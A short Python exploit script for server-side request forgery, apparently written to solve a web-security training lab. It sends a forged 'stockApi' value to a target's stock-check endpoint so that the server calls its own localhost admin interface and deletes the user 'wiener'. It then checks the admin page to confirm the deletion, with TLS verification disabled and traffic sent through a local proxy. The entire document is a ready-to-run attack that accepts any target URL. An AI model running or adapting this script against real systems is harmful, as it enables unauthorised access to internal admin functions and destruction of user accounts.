import requests
import sys 
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def del_user(url):
 api_var = 'http://localhost/admin/delete?username=wiener'
 params = {'stockApi': api_var}
 check = '/product/stock'
 r = requests.post(url + check ,data=params , verify=False,proxies=proxies)
# Check if user was deleted
 admin_ssrf_payload = 'http://localhost/admin'
 params2 = {'stockApi': admin_ssrf_payload}
 r = requests.post(url + check, data=params2, verify=False, proxies=proxies)
 if 'User deleted successfully' in r.text:
     print("(+) Successfully deleted wiener user!")
 else:
     print("(-) Exploit was unsuccessful.")

def main():
 if len(sys.argv) != 2:
  print (" (+)Usage %s www.example.com " %sys.argv[0])
  sys.exit(-1)

 url = sys.argv[1]
 print("Deleting wiener...")
 del_user(url)

if __name__ == "__main__":
 main()
